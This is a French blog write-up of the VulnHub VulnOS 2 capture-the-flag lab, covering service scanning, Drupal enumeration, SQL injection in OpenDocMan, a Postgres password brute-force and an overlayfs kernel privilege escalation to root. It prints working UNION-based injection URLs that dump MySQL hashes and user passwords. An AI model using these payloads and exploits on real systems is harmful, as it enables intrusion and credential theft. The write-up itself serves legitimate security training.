# Solution du CTF VulnOS: 2 de VulnHub

Le CTF [VulnOS 2](https://www.vulnhub.com/entry/vulnos-2,147/) est un boot2root composé de services vulnérables.  

[Le premier de la série](http://devloop.users.sourceforge.net/index.php?article86/solution-du-ctf-vulnos-1) était un peu chargé côté services, c'est l'occasion de voir ce que ce second opus a dans le ventre !  

Nitro
-----

```plain
Nmap scan report for 192.168.2.4
Host is up (0.00062s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 f5:4d:c8:e7:8b:c1:b2:11:95:24:fd:0e:4c:3c:3b:3b (DSA)
|   2048 ff:19:33:7a:c1:ee:b5:d0:dc:66:51:da:f0:6e:fc:48 (RSA)
|_  256 ae:d7:6f:cc:ed:4a:82:8b:e8:66:a5:11:7a:11:5f:86 (ECDSA)
80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: VulnOSv2
6667/tcp open  irc     ngircd
MAC Address: 08:00:27:57:4F:AA (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.0
Network Distance: 1 hop
Service Info: Host: irc.example.net; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Ici un serveur Apache et un ngircd...  

Quand on se connecte à se dernier on a une invite *running version ngircd-21 (i686/pc/linux-gnu)*. D'après mes recherche il s'agit d'une version maintenue entre 2013 et 2017, pas d'exploits connus.  

Comme il n'y a aucun autre utilisateur connecté et aucun channel sur le serveur on se demande bien à quoi sert ce service.  

Côté web le module buster de Wapiti permet de trouver une piste différente :  

```plain
[*] Launching module buster
Found webpage http://192.168.2.4/javascript
Found webpage http://192.168.2.4/jabc/index.php
Found webpage http://192.168.2.4/jabc/templates
Found webpage http://192.168.2.4/jabc/themes
Found webpage http://192.168.2.4/jabc/includes
Found webpage http://192.168.2.4/jabc/modules
Found webpage http://192.168.2.4/jabc/scripts
Found webpage http://192.168.2.4/jabc/robots.txt
Found webpage http://192.168.2.4/jabc/install.php
Found webpage http://192.168.2.4/jabc/misc
Found webpage http://192.168.2.4/jabc/xmlrpc.php
Found webpage http://192.168.2.4/jabc/profiles
Found webpage http://192.168.2.4/jabc/sites
```

Il s'agit ici d'un *Drupal* dont la version est facilement identifiable :  

```html
<meta name="Generator" content="Drupal 7 (http://drupal.org)" />
```

On note aussi la présence du script *xmlrpc.php* qui ne se montre pas vulnérable (un exploit est présent dans *Metasploit*) mais peut s'avérer utile pour énumérer les utilisateurs *Drupal* par exemple.  

Yet another CMS story
---------------------

Dans un premier temps j'ai eu recours à [CMSmap](https://github.com/Dionach/CMSmap). Le logiciel crashe sur l'énumération des modules car pour chaque module trouvé il effectue une recherche sur exploit-db, sauf qu'il y a maintenant un captcha à passer. On peut passer outre via l'option *--noedb* mais du coup vu le nombre de modules trouvés ça ne nous facilite pas la tache...  

Le logiciel parvient tout de même à trouver un utilisateur *webmin*.  

J'ai décidé de retenter ma chance avec [droopescan](https://github.com/droope/droopescan) :  

```plain
[+] Themes found:                                                               
    seven http://192.168.2.4/jabc/themes/seven/
    garland http://192.168.2.4/jabc/themes/garland/

[+] No interesting urls found.

[+] Possible version(s):
    7.22
    7.23
    7.24
    7.25
    7.26

[+] Plugins found:
    ctools http://192.168.2.4/jabc/sites/all/modules/ctools/
        http://192.168.2.4/jabc/sites/all/modules/ctools/CHANGELOG.txt
        http://192.168.2.4/jabc/sites/all/modules/ctools/LICENSE.txt
        http://192.168.2.4/jabc/sites/all/modules/ctools/API.txt
    views http://192.168.2.4/jabc/sites/all/modules/views/
        http://192.168.2.4/jabc/sites/all/modules/views/README.txt
        http://192.168.2.4/jabc/sites/all/modules/views/LICENSE.txt
    token http://192.168.2.4/jabc/sites/all/modules/token/
        http://192.168.2.4/jabc/sites/all/modules/token/README.txt
        http://192.168.2.4/jabc/sites/all/modules/token/LICENSE.txt
    libraries http://192.168.2.4/jabc/sites/all/modules/libraries/
        http://192.168.2.4/jabc/sites/all/modules/libraries/CHANGELOG.txt
        http://192.168.2.4/jabc/sites/all/modules/libraries/README.txt
        http://192.168.2.4/jabc/sites/all/modules/libraries/LICENSE.txt
    entity http://192.168.2.4/jabc/sites/all/modules/entity/
        http://192.168.2.4/jabc/sites/all/modules/entity/README.txt
        http://192.168.2.4/jabc/sites/all/modules/entity/LICENSE.txt
    ckeditor http://192.168.2.4/jabc/sites/all/modules/ckeditor/
        http://192.168.2.4/jabc/sites/all/modules/ckeditor/CHANGELOG.txt
        http://192.168.2.4/jabc/sites/all/modules/ckeditor/README.txt
        http://192.168.2.4/jabc/sites/all/modules/ckeditor/LICENSE.txt
    rules http://192.168.2.4/jabc/sites/all/modules/rules/
        http://192.168.2.4/jabc/sites/all/modules/rules/README.txt
        http://192.168.2.4/jabc/sites/all/modules/rules/LICENSE.txt
    addressfield http://192.168.2.4/jabc/sites/all/modules/addressfield/
        http://192.168.2.4/jabc/sites/all/modules/addressfield/LICENSE.txt
    plupload http://192.168.2.4/jabc/sites/all/modules/plupload/
        http://192.168.2.4/jabc/sites/all/modules/plupload/CHANGELOG.txt
        http://192.168.2.4/jabc/sites/all/modules/plupload/README.txt
        http://192.168.2.4/jabc/sites/all/modules/plupload/LICENSE.txt
    commerce http://192.168.2.4/jabc/sites/all/modules/commerce/
        http://192.168.2.4/jabc/sites/all/modules/commerce/README.txt
        http://192.168.2.4/jabc/sites/all/modules/commerce/LICENSE.txt
    image http://192.168.2.4/jabc/modules/image/
    profile http://192.168.2.4/jabc/modules/profile/
    php http://192.168.2.4/jabc/modules/php/

[+] Scan finished (0:00:06.160777 elapsed)
```

Le directory listing est activé sur les dossiers des modules et on trouve les fichiers avec extension *.info* qui nous permettent d'avoir plus de précision sur la version de *Drupal* (7.26).  

Il y a bien [un exploit](https://www.exploit-db.com/exploits/34992/) qui pourrait toucher cette version mais même en changeant l'URL de la page de login dans le code (car ne correspond pas à notre cas), ça n'aboutit pas.  

Chercher des exploits pour les différents modules présents est fastidieux et peut récompensé :(  

Bitch please
------------

Finalement sur la section *Documentation* du *Drupal* on découvre un texte noir sur fond noir...  

> For a detailed view and documentation of our products, please visit our documentation platform at /jabcd0cs/ on the server. Just login with guest/guest

Cette URL nous mène à un *OpenDocMan*. L'accès *guest* ne nous est pas de grande utilité mais le logiciel est vulnérable [à une faille SQL](https://www.exploit-db.com/exploits/32075/).  

*sqlmap* pataugeait sur l'exploitation, ne voyant pas qu'il ne s'agissait pas d'une exploitation en aveugle il voulait absolument faire une attaque boolean ou time based alors que le PoC affiche avec succès la version de MySQL :-/   

On n'est pas des manches, on se retrousse les manches ! Exploitation à l'ancienne directement dans le navigateur et on obtient facilement le nom de la base courante (*jabcd0cs*) ainsi que les utilisateurs existants (root et phpmyadmin).  

Avec une URL comme la suivante on peut obtenir les tables dans cette base (*odm\_admin*, *odm\_user*, *odm\_settings*, etc) :  

```plain
/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user%20UNION%20SELECT%201,TABLE_NAME,3,4,5,6,7,8,9%20from%20information_schema.tables%20where%20table_schema=0x6A61626364306373
```

et avec l'injection suivante on obtient les hashs des utilisateurs MySQL :  

```plain
UNION (SELECT 1,concat(User,Password),3,4,5,6,7,8,9 from mysql.user order by User)
```

```plain
root*9CFBBC772F3F6C106020035386DA5BBBF1249A11
phpmyadmin*9CFBBC772F3F6C106020035386DA5BBBF1249A11
drupal7*9CFBBC772F3F6C106020035386DA5BBBF1249A11
```

Qui correspondent tous à *toor*.  

Je continue d'explorer, trouve encore un utilisateur *webmin* pour le *OpenDocMan* et extrait son mot de passe (*webmin1980*) avec l'injection  

```plain
UNION SELECT distinct 1,password,3,4,5,6,7,8,9 from odm_user where username=0x7765626D696E
```

Le pied dans la porte
---------------------

Ces identifiants nous permettent d'avoir un accès SSH :  

```plain
$ id
uid=1001(webmin) gid=1001(webmin) groups=1001(webmin)
$ uname -a
Linux VulnOSv2 3.13.0-24-generic #47-Ubuntu SMP Fri May 2 23:31:42 UTC 2014 i686 i686 i686 GNU/Linux
$ lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 14.04.4 LTS
Release:        14.04
Codename:       trusty
```

Dans le dossier personnel de l'utilisateur on trouve une archive *post.tar.gz* qui contient un *thc-hydra*, ce qui laisserait supposer qu'il faut bruteforcer un compte.  

Comme il y a un Postgres qui écoute sur 127.0.0.1 on utilise Hydra qui trouve facilement un compte :  

```plain
[5432][postgres] host: 127.0.0.1   login: postgres   password: postgres
```

Ne connaissant pas trop *Postgres* je n'ai pas trouvé [la solution officielle](https://download.vulnhub.com/media/vulnos2/VulnOSv2%20Walkthrough%20-%20c4b3rw0lf.pdf) qui consistait à se branche sur une autre base pour y trouver le mot de passe de l'utilisateur *vulnosadmin* puis ouvrir un fichier *Blender* (wut?)... bref pas de regrets.  

J'ai eu le même réflexe que les autres participants du CTF (exploit kernel) :  

```plain
webmin@VulnOSv2:~$ gcc -o overlay overlay.c
webmin@VulnOSv2:~$ ./overlay
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),1001(webmin)
```

Et le flag attentdu :  

```plain
You successfully compromised the company "JABC" and the server completely !!
Congratulations !!!
Hope you enjoyed it.

What do you think of A.I.?
```

La pensée du jour
-----------------

Comme pour le précédent de la série, ce ne sera pas un CTF qui me laisse un souvenir très positif : un Drupal qui ne sert à rien et un lien en noir sur noir, un scénario officiel irréel et finalement un exploit classique sur le kernel. Meh!  

J'ai d'autres walkthrough sur la planche qui devraient venir d'ici peu.  


*Published March 09 2018 at 13:28*